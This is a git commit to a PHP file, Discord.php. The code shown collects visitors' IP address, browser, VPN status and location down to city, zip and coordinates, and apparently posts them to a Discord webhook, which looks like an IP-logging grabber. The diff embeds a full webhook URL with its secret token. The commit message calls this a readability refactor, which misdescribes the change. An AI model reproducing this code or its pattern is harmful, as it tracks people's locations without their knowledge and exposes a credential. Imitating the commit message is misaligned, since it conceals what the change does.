102f75ac2ce288d38eb6fd1660113466eebe7d44
medinaheitor887-eng <medinaheitor887@gmail.com>
2026-06-10 19:13:08 -0300

    Refactor Discord.php to improve readability

--- Discord.php
+++ Discord.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discordapp.com/api/webhooks/1514389335556882463/TU1tlsrIuQRG8zpRlMIx3LEqvyAHcqGgoYAWvXLMRnkxLJbBXIJe8GgwFWxxQcGrgJ_4";
 
         $InfoArr = array(
             "username" => "$WebhookName",
